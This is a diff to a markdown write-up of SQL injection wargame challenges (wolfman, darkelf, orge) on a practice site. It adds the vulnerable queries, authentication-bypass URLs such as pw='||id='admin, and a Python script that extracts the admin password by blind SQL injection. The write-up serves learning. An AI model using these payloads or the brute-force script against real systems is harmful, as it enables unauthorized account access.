@@ -101,6 +101,8 @@ print("pw = " + pw)
 
 ![pwned](./pwned/orc.PNG)
 
+<br>
+
 ## wolfman
 
 ![wolfman](./pic/wolfman.PNG)
@@ -113,5 +115,58 @@ select id from prob_wolfman where id='guest' and pw=''||id='admin'
 __exploit :__ https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw='||id='admin
 
 ![wolfman](./pwned/wolfman.PNG)
+
+<br>
+
+## darkelf
+
+![darkelf](./pic/darkelf.PNG)
+
+__query :__
+```SQL
+select id from prob_darkelf where id='guest' and pw=''||id='admin'
+```
+
+__exploit :__ https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw='||id='admin
+
+![darkelf](./pwned/darkelf.PNG)
+
+<br>
+
+## orge
+
+___Blind SQL Injection!___
+
+length: 8
+
+![orc-length](./pic/orge-length.PNG)
+
+__exploit__ : [orge.py](./code/orge.py)
+
+```Python
+import requests
+import string
+
+#settings
+pw=""
+string= string.digits + string.ascii_letters #0123456789abc...XYZ
+url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw="
+session = dict(PHPSESSID="input_your_session_id") #input your session id!
+
+
+#starting Blind SQL Injection
+for i in range(1, 9):
+    for a in range(len(string)):
+        query = url + "'||id = 'admin'%26%26substr(pw," + str(i) + ",1)='" + string[a]
+        req = requests.post(query, cookies=session)
+
+        if "Hello admin" in req.text:
+            pw += string[a]
+            break
+
+print("pw = " + pw)
+```
+
+![pwned](./pwned/orge.PNG)
 
 <br>
